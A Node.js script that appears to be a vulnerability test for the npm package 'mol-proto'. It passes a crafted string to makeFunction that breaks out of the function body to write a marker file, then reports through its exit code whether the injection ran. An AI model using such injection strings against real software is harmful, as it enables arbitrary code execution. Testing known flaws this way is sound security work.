if (!process.env.DANGEROUS_RUN_VULN) {
	console.log(
		"NOT RUNNING VULNERABLE CODE WITHOUT 'DANGEROUS_RUN_VULN' ENVIRONMENT VARIABLE",
	);
	process.exit(1);
}

const fs = require("fs");
const mp = require("mol-proto");
const path = "./mol-proto";
file_exist = fs.existsSync(path);
console.log("a", file_exist);
try {
	mp.makeFunction(
		"a",
		"b",
		"};require('fs').writeFileSync('./mol-proto', '');{",
	);
} catch (error) {}
file_exist = fs.existsSync(path);
fs.unlink(path, function (err) {});
console.log("b", file_exist);

if (file_exist) {
	process.exit(0);
} else {
	process.exit(82);
}
